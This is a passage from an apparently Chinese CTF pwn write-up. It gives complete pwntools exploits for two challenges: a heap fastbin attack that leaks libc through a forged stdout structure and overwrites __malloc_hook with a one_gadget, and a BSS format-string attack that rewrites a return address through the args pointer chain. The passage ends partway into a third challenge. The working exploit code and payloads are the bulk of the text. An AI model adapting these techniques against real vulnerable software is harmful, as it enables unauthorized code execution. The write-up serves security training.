
```python
#!/usr/bin/python2
from pwn import *
p=0
def pwn():
    global p
    p=process('./de1ctf_2019_weapon')
    #p=remote('node4.buuoj.cn',27513)
    elf=ELF('./de1ctf_2019_weapon')
    libc=elf.libc

    def add(size,idx,name):
        p.sendlineafter('>>','1')
        p.sendlineafter(': ',str(size))
        p.sendlineafter(': ',str(idx))
        p.sendafter(':',name)

    def delete(idx):
        p.sendlineafter('>>','2')
        p.sendlineafter(':',str(idx))

    def edit(idx,data):
        p.sendlineafter('>>','3')
        p.sendlineafter(': ',str(idx))
        p.sendafter(':',data)

    payload=p64(0)*1+p64(0x71)
    add(0x28,0,payload)
    add(0x18,1,'cccc')
    add(0x38,2,'dddd')
    add(0x60,3,'eeee')
    #gdb.attach(p)
    add(0x60,4,'aaaa')
    #gdb.attach(p)
    add(0x60,5,'bbbb')
    #gdb.attach(p)
    delete(3)
    #gdb.attach(p)
    delete(4)
    #gdb.attach(p)
    edit(4,'\x10')
    #gdb.attach(p)
    add(0x60,8,'dd')
    #gdb.attach(p)
    add(0x60,7,p64(0)*3+p64(0x21)+p64(0)*3+p64(0xb1))
    #gdb.attach(p)
    delete(2)
    delete(3)
    #gdb.attach(p)
    add(0x38,2,'aaa')
    edit(3,'\xdd\x85')
    payload1='\x00'*0x33+p64(0xfbad3c80)+3*p64(0)+p8(0)#0x33 p &_IO_2_1_stdout=0x7fc3e534c620  0x620-0x5dd-0x10=0x33
    add(0x60,8,'aaa')

    add(0x60,9,payload1)
    #gdb.attach(p)

    libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c5600
    #gdb.attach(p)
    print(hex(libcbase))
    malloc_hook=libcbase+libc.sym['__malloc_hook']
    o_g=[0x45216,0x4526a,0xf02a4,0xf1147]
    one_gadget=libcbase+o_g[3]
    delete(3)
    delete(4)
    delete(3)
    add(0x60,3,p64(malloc_hook-0x23))
    add(0x60,6,'doudou')
    add(0x60,4,'doudou1')
    add(0x60,8,'a'*0x13+p64(one_gadget))
    log.success('libcbase: '+hex(libcbase))
    p.sendlineafter('>>','1')
    p.sendlineafter(': ',str(0x20))
    p.sendlineafter(': ',str(8))
    p.interactive()
    return True

if __name__=="__main__":
    while 1:
        try:
            if pwn()==True:
                break
        except Exception as e:
            p.close()
            continue
```

## 2. npuctf_2020_level2（BSS段上的格式化字符串利用，args链）

做了这道题，实际上对于基础 pwn 有了更通透的理解，最本质的还是去更改控制地址链。这里我们控制 `args` 链。

```text
pwndbg> stack
6000:0000│ rsp 0x7fffffffdfb8 —▸ 0x5555555547f5 (main+91) ◂— lea    rsi, [rip + 0xb8]
01:0008│ rbp 0x7fffffffdfc0 —▸ 0x555555554830 (__libc_csu_init) ◂— push   r15
02:0010│ 0x7fffffffdfc8 —▸ 0x7ffff7a03bf7 (__libc_start_main+231) ◂— mov    edi, eax
03:0018│ 0x7fffffffdfd0 ◂— 0x10
04:0020│ 0x7fffffffdfd8 —▸ 0x7fffffffe0a8 —▸ 0x7fffffffe3d3 ◂— '/home/q/Desktop/npuctf_2020_level2'
```

`0x7fffffffdfd8 —▸ 0x7fffffffe0a8 —▸ 0x7fffffffe3d3 ◂— '/home/q/Desktop/npuctf_2020_level2'` 这条链接就是 `args` 链。

我们用 `%p` 泄露地址就可以知道其中 `0x7fffffffe0a8` 的偏移是 9，`0x7fffffffe3d3` 的偏移是 35。

不过因为不可能一次性写入非常大的数据，我们的 `one_gadget` 需要进行拆分，分 2 次写入。

我们这里控制栈的返回地址也就是 `bp+8`，分 2 次写入 `one_gadget`。第一步改写偏移为 9 的地方为 `bp+8`，然后写入一半的 `one_gadget` 在偏移 35 处。第二步重复，不过是写入另外一半。对于数据的拆分 `exp` 中有，可以看下脚本运行的拆分结果。

因为最后 3 个字节是固定的，前面的 `0x7f` 什么的都是动态的，我们不用管。反正在程序里面栈有栈的 `0x7fxxxx`，`libc` 有 `libc` 的，我们只用改最后 3 个字节就行了。

```text
q@ubuntu:~/Desktop$ python2 bssformat.py
[+] Starting local process './npuctf_2020_level2': pid 2940
[+] Opening connection to node4.buuoj.cn on port 25838: Done
[+] stack_addr ===> 0x7ffc0e7814a8
[+] libc_addr ===> 0x7f52ca086638
[+] stack_ret_addr ===> 0x7ffc0e7813c8
[+] libc_base_addr ===> 0x7f52c9c9f000
[+] one_gadget ===> 0x7f52c9cee2c5
[*] one_gadget1:0xe2c5
[*] one_gadget2:0xce
[*] Switching to interactive mode
```

不过需要注意的是，因为我们写入的数据不算小的，还要用去输入一些 `junk code` 去刷新下缓冲区，然后 `sleep` 去等待刷新。

### exp

```python
from pwn import *
import functools

LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.update(arch='amd64', os='linux', endian='little')

r = process('./npuctf_2020_level2')
r = remote('node4.buuoj.cn','25838')
r.sendline("%9$p,%24$p")
msg = r.recvline()
stack_addr, libc_addr = msg[:-1].split(b',')

stack_addr = int16(stack_addr.decode())
libc_addr = int16(libc_addr.decode())
LOG_ADDR('stack_addr', stack_addr)
LOG_ADDR('libc_addr', libc_addr)

stack_ret_addr = stack_addr - 0xe0
libc_base_addr = libc_addr - 0x3e7638

LOG_ADDR('stack_ret_addr', stack_ret_addr)
LOG_ADDR('libc_base_addr', libc_base_addr)

gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = libc_base_addr + gadgets[0]

LOG_ADDR('one_gadget', one_gadget)
sleep(1)

payload = "%{}c%9$hn".format((stack_ret_addr & 0xffff))
r.sendline(payload)
r.recv()

for _ in range(2):
    r.sendline('a' * 0x30)
    r.recv()
    sleep(2)

payload = "%{}c%35$hn".format((one_gadget & 0xffff)) + 'a' * 0x10
r.sendline(payload)
r.recv()
sleep(2)

for _ in range(2):
    r.sendline('a' * 0x30)
    r.recv()
    sleep(2)

payload = "%{}c%9$hhn".format((stack_ret_addr & 0xff) + 2)
r.sendline(payload)
r.recv()
sleep(2)

for _ in range(2):
    r.sendline('a' * 0x30)
    r.recv()
    sleep(2)

payload = "%{}c%35$hhn".format(((one_gadget >> 16) & 0xff)) + 'a' * 0x10
r.sendline(payload)
r.recv()
sleep(2)

for _ in range(2):
    r.sendline('a' * 0x30)
    r.recv()
    sleep(2)

r.send("6" * 8 + '\x00' * 8)

sleep(3)

r.sendline("cat flag")

r.interactive()
```

## 3. SWPUCTF_2019_login（BSS段上的格式化字符串利用，bp链）

和上面的题如出一辙，不过这个题呢没有 `args` 链可以用，有 `bp` 链我们改 `bp` 链，`bp` 链如下。

在 `ebp` 指向的一条单链，这里没有开 `pie`，可以有条件进行 `got` 表更改。
